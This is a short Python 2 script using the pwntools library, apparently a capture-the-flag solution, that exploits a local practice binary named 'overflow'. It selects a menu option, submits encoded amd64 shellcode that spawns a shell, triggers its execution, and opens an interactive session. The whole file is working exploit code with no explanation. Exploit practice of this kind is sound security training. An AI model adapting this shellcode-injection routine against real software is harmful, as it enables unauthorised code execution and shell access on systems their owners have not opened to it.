#!/usr/bin/env python2
from pwn import *

context(arch='amd64', os='linux')

def execute_shellcode(p):
    print(p.recvuntil("Choice:"))
    p.sendline("2")

def send_shellcode(p):
    print(p.recvuntil("Choice:"))
    p.sendline("1")
    print(p.recvuntil("Input shellcode:"))
    p.sendline(encoder.line(asm(shellcraft.sh())))

p = process('./overflow')

send_shellcode(p)
execute_shellcode(p)
p.interactive()
